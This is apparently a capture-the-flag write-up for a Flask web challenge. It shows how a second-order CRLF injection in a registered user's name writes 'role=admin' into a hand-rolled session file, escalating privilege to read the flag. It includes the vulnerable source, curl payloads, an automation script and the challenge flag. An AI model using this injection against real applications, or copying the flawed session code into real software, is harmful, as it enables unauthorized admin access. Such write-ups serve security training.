# Day 15 - New New Always New

- Category: Web
- Difficulty: Easy / Medium
- Format: Whitebox

## Description

Santa sees OWASP 2025 coming very quickly, and is frightened by all the vulnerabilities on the web. He doesn't understand how this is possible, and besides, he does everything by hand, so there's no problem.

## Writeup

**TLDR: 2nd order CRLF in session, privilege escalation**

By reading the source code, we understand quite fast that the final goal is to reach /admin endpoint with admin privileges to get the flag :

```python
@app.route('/admin')
def admin():
    session_id = request.cookies.get('session_id')
    if not session_id:
        return jsonify(error="Not connected"), 401

    session_data = load_session(session_id)
    if not session_data:
        return jsonify(error="Invalid session"), 401

    if session_data['role'] != 'admin':
        return jsonify(error="Forbidden access, you are not an administrator."), 403

    try:
        with open('flag.txt') as f:
            flag = f.read().strip()
        return jsonify(success=f"Welcome back admin! Here is the flag: {flag}"), 200
    except FileNotFoundError:
        return jsonify(error="Flag file not found, contact admin."), 404
```

We also discover that session management is also totally implemented by hand. The system is based on a configuration file stored in ./sessions. Each file is represented by a UUIDv4, making it unpredictable.

```python
def create_session(email, name, role):
    session_id = str(uuid.uuid4())
    session_file = os.path.join(SESSION_DIR, f'session_{session_id}.conf')

    with open(session_file, 'w') as f:
        f.write(f'email={email}\n')
        f.write(f'role={role}\n')
        f.write(f'name={name}\n')

    return session_id

def load_session(session_id):
    if not re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', session_id):
        return None

    session_file = os.path.join(SESSION_DIR, f'session_{session_id}.conf')
    if not os.path.exists(session_file):
        return None

    session_data = {}
    with open(session_file, 'r') as f:
        for line in f:
            key, value = line.strip().split('=')
            session_data[key] = value
    return session_data
```

The data stored in the session are the user's email, role and name. By default when register the default role is assigned to "user" :

```python
@app.route('/register', methods=['POST'])
def register():
    email = request.json.get('email')
    name = request.json.get('name')
    password = request.json.get('password')

    password_hash = generate_password_hash(password)

    user = User(email=email, name=name, role='user', password_hash=password_hash)
    db.session.add(user)
    db.session.commit()

    return jsonify(success="User registered successfully"), 201
```

It is during the login process that session is created and cookie returned to the user to authentication:

```python
@app.route('/login', methods=['POST'])
def login():
    email = request.json.get('email')
    password = request.json.get('password')

    user = User.query.filter_by(email=email).first()

    if user and check_password_hash(user.password_hash, password):
        session_id = create_session(user.email, user.name, user.role)
        response = make_response(jsonify(success="Logged in successfully"))
        response.set_cookie('session_id', session_id)
        return response
    
    return jsonify(error="Invalid credentials"), 401
```

Looking more closely at the contents of a session variable, we notice that the application injects '\n' to add new lines in the file.

First register an account :

```bash
curl http://localhost:8000/register -H 'Content-type: application/json' -d '{"email": "root@elweth.fr", "name": "elweth", "password": "Str0ng_Of_Course"}'
{
    "success":"User registered successfully"
}
```

Then login :

```bash
curl http://localhost:8000/login -H 'Content-type: application/json' -d '{"email": "root@elweth.fr", "password": "Str0ng_Of_Course"}' -i
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.9.20
Content-Type: application/json
Content-Length: 37
Set-Cookie: session_id=73152ff0-743f-4e63-9bbb-e92a0f9b44a0; Path=/
Connection: close

{
    "success":"Logged in successfully"
}
```

When jumping in the docker we can print the session file :

```bash
root@c5f9c0254f54:~# cat /app/sessions/session_73152ff0-743f-4e63-9bbb-e92a0f9b44a0.conf 
email=root@elweth.fr
role=user
name=elweth
```

As expected, our account is 'user' and can't access to the flag

```bash
curl http://localhost:8000/admin -H "Cookie: session_id=73152ff0-743f-4e63-9bbb-e92a0f9b44a0"
{
    "error":"Forbidden access, you are not an administrator."
}
```

If the application inject new lines in session file, what if we could do it? Let's try ..

```python
with open(session_file, 'w') as f:
    f.write(f'email={email}\n')
    f.write(f'role={role}\n')
    f.write(f'name={name}\n')
```

Register injecting new line in name :

```bash
curl http://localhost:8000/register -H 'Content-type: application/json' -d '{"email": "root2@elweth.fr", "name": "elweth\r\npouet=pouet", "password": "Str0ng_Of_Course"}'
```

After logged in, in the docker container we can oberve the behaviour expected, we managed to insert new variable in the config file :

```bash
root@c5f9c0254f54:~# cat /app/sessions/session_814268bf-eaf9-46f5-b157-9e7411db237e.conf 
email=root2@elweth.fr
role=user
name=elweth
pouet=pouet
```

We can confirm we have a 2nd order CRLF

To exploit it we will need to insert a new value to override the initial role 'user' to 'admin'.

Like many parsers the parser used here uses the last value of a key found in a file, like python json for example :

```python
>>> x = json.loads('{"role": "user", "user": "elweth", "user": "admin"}')
>>> x['user']
'admin'
```

So to exploit is we will create an account with CRLF to add `role=admin`

```bash
curl http://localhost:8000/register -H 'Content-type: application/json' -d '{"email": "root3@elweth.fr", "name": "elweth\r\nrole=admin", "password": "Str0ng_Of_Course"}'

{
    "success":"User registered successfully"
}
```

Then login to get a session cookie and fetch the /admin endpoint to get the flag!

```bash
curl http://localhost:8000/admin -H "Cookie: session_id=7726282a-11cb-42cd-82f3-d3b833a2b792"

{
    "success":"Welcome back admin! Here is the flag: RM{I_Thought_Th1s_VUlnerab1ility_W4s_N0t_Imp0rtant}"
}
```

The process can be automated with the following script :

```bash
email=$RANDOM
target=localhost
port=8000

# Register the user with the CRLF
curl -X POST "$target:$port/register" -H 'Content-type: application/json' -d '{"email": "'$email'", "name": "a\r\nrole=admin", "password": "a"}'

# Login
session_id=`curl -s -X POST "$target:$port/login" -H 'Content-type: application/json' -d '{"email": "'$email'", "password": "a"}' -i | grep session_id | cut -d'=' -f2 |cut -d';' -f1`

echo "Session id: $session_id"
# Check roles
curl -s "$target:$port/dashboard" -H "Cookie: session_id=$session_id" | grep 'admin' && echo 'Looks good ...'

# Flag

curl -s "$target:$port/admin" -H "Cookie: session_id=$session_id"
```